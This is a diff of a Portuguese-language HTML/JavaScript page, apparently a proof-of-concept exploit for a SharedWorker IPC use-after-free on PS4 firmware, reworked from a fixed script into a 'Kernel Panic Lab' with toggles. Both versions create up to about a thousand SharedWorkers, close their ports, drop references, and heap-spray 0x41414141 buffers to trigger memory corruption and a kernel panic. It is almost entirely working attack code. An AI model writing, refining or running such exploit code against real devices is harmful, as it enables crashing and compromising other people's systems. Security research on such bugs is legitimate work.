@@ -2,133 +2,109 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 SharedWorker IPC UAF PoC</title>
+    <title>Kernel Panic Lab</title>
     <style>
-        body { padding: 20px; }
-          #log {word-wrap: break-word; padding: 10px; }
-   </style>
+        body { background: #222; color: #eee; font-family: sans-serif; padding: 20px; }
+        .control-panel { background: #333; padding: 15px; border-radius: 8px; border: 1px solid #555; }
+        button { font-size: 18px; padding: 10px 20px; background: #d32f2f; color: white; border: none; cursor: pointer; margin-top: 10px; width: 100%; }
+        button:hover { background: #b71c1c; }
+        label { display: block; margin: 10px 0; font-size: 16px; }
+        input[type="number"] { padding: 5px; width: 100px; }
+        #log { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; margin-top: 20px; font-family: monospace; border: 1px solid #444; }
+    </style>
 </head>
 <body>
 
-    <h1>KERNEL IPC RACE POC</h1>
-    
-    <button onclick="runPrecisionExploit()">INICIAR TESTE</button>
+    <h1>🔬 Laboratório de Causa Raiz</h1>
 
-    <div id="log">Aguardando início...</div>
+    <div class="control-panel">
+        <label>
+            Quantidade de Workers:
+            <input type="number" id="workerCount" value="1000">
+        </label>
+        
+        <label>
+            <input type="checkbox" id="doClose" checked> Executar .port.close() (Gatilho de Destruição)
+        </label>
+
+        <label>
+            <input type="checkbox" id="doNull" checked> Remover Referências (workers = null)
+        </label>
+
+        <label>
+            <input type="checkbox" id="doSpray" checked> Injetar Heap Spray (0x41414141)
+        </label>
+
+        <button onclick="runTest()">RODAR TESTE</button>
+    </div>
+
+    <div id="log">Logs aparecerão aqui...</div>
 
     <script>
-        // CONFIGURAÇÕES DO TESTE
-        const TARGET_WORKERS = 1000; // Reduzido de 4500 para 3800 a seu pedido
-        const SPRAY_SIZE = 1024 * 256; // 256KB por chunk
-        const SPRAY_COUNT = 500; // Quantidade de chunks para alocar
-        
-        // PAYLOAD DE MEMÓRIA (Padrão de Bytes)
-        // 0x41414141 = "AAAA" (Padrão clássico de exploit)
-        // 0x00000000 = Zeros (Teste de Null Pointer)
-        const PAYLOAD_VALUE = 0x41414141; 
+        let workers = [];
 
         function log(msg) {
             const el = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            el.innerHTML = `[${time}] ${msg}\n` + el.innerHTML;
+            el.innerHTML = `> ${msg}\n` + el.innerHTML;
         }
 
-        function runPrecisionExploit() {
-            log("=== INICIANDO POC SHAREDWORKER IPC ===");
-            log(`Alvo: ${TARGET_WORKERS} conexões.`);
-            log("Preparando heap...");
+        function runTest() {
+            const count = parseInt(document.getElementById('workerCount').value);
+            const doClose = document.getElementById('doClose').checked;
+            const doNull = document.getElementById('doNull').checked;
+            const doSpray = document.getElementById('doSpray').checked;
 
-            if (!window.SharedWorker) {
-                log("ERRO: SharedWorker não suportado neste firmware.");
-                return;
-            }
+            log(`=== INICIANDO TESTE COM ${count} WORKERS ===`);
 
-            let workers = [];
-            let count = 0;
+            if (!window.SharedWorker) return log("SharedWorker não suportado.");
 
-            // Intervalo rápido para criação (Flood)
-            const interval = setInterval(() => {
-                // Cria em lotes de 10 para não travar a UI completamente
-                for (let i = 0; i < 10; i++) {
-                    try {
-                        // O nome único força o Kernel a criar uma nova estrutura de processo/IPC
-                        const id = "ipc_uaf_" + count;
-                        const sw = new SharedWorker("data:text/javascript,onconnect=function(e){let p=e.ports[0];p.start();}", id);
-                        
-                        // Inicia a porta explicitamente para alocar o handle no Kernel
-                        sw.port.start();
-                        workers.push(sw);
-                        count++;
-
-                    } catch (e) {
-                        clearInterval(interval);
-                        log("ERRO DE CRIAÇÃO (Limite atingido antes da hora): " + e.message);
-                        // Se falhar antes, tentamos detonar com o que temos
-                        triggerDestruction(workers);
-                        return;
-                    }
-                }
-
-                if (count % 200 === 0) log(`Workers ativos: ${count}...`);
-
-                // GATILHO DE PRECISÃO
-                if (count >= TARGET_WORKERS) {
-                    clearInterval(interval);
-                    log(`Alvo ${TARGET_WORKERS} atingido. Pausando para estabilizar (500ms)...`);
-                    
-                    // Pequena pausa para garantir que todos os workers foram registrados no Kernel
-                    setTimeout(() => {
-                        triggerDestruction(workers);
-                    }, 500);
-                }
-            }, 5);
-        }
-
-        function triggerDestruction(workersList) {
-            log("!!! INICIANDO FASE DE DESTRUIÇÃO !!!");
-            log("Tentando Race Condition: Close() -> Nullify -> Spray");
-
-            // 1. FECHAMENTO EM MASSA (Síncrono)
-            // Tenta fechar os handles o mais rápido possível
-            const total = workersList.length;
+            // FASE 1: ALOCAÇÃO
+            log("Criando workers...");
+            workers = [];
             try {
-                for (let i = 0; i < total; i++) {
-                    workersList[i].port.close();
+                for(let i=0; i<count; i++) {
+                    const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "ktest_" + Date.now() + "_" + i);
+                    sw.port.start();
+                    workers.push(sw);
                 }
-                log("Comando .close() enviado para todos os workers.");
-            } catch (e) {
-                log("Erro no loop de fechamento: " + e.message);
+            } catch(e) {
+                return log("Erro na criação: " + e.message);
             }
 
-            // 2. REMOÇÃO DE REFERÊNCIAS
-            workersList = null; 
-            
-            // 3. HEAP SPRAY (Imediato)
-            // Tenta ocupar o espaço que o Kernel está liberando agora em background
-            log(`Injetando Heap Spray (${PAYLOAD_VALUE.toString(16)})...`);
-            
+            log(`${workers.length} criados. Iniciando gatilhos em 200ms...`);
+
             setTimeout(() => {
-                try {
-                    const pressure = [];
-                    // Cria o buffer com o padrão escolhido
-                    const chunk = new Uint32Array(SPRAY_SIZE).fill(PAYLOAD_VALUE);
-                    
-                    for (let i = 0; i < SPRAY_COUNT; i++) {
-                        pressure.push(chunk.slice(0)); // Clona o chunk
-                    }
-                    
-                    log("<span class='danger'>SPRAY CONCLUÍDO.</span>");
-                    log("Kernel Panic em alguns segundos!");
-            
-                    
-                } catch (e) {
-                    log("OOM (Out of Memory) durante o Spray - Isso também é bom.");
+                // FASE 2: DESTRUIÇÃO (O Gatilho Principal)
+                if (doClose) {
+                    log("Executando .port.close()...");
+                    for(let w of workers) w.port.close();
+                } else {
+                    log("PULANDO .port.close()");
                 }
-            }, 50); // Delay mínimo para pegar a janela de corrida
+
+                // FASE 3: LIMPEZA DE REFERÊNCIA (Para o GC)
+                if (doNull) {
+                    log("Anulando referências (workers = null)...");
+                    workers = null;
+                }
+
+                // FASE 4: HEAP SPRAY (Ocupar o lugar do morto)
+                if (doSpray) {
+                    log("Injetando Spray (ocupando memória)...");
+                    try {
+                        const spray = [];
+                        const chunk = new Uint32Array(1024 * 64).fill(0x41414141); // 256KB
+                        for(let i=0; i<400; i++) spray.push(chunk.slice(0));
+                    } catch(e) { log("Spray OOM (Normal)."); }
+                }
+
+                log("Ciclo concluído. Aguardando reação do Kernel...");
+            }, 200);
         }
     </script>
 </body>
 </html>
+
 
 
 
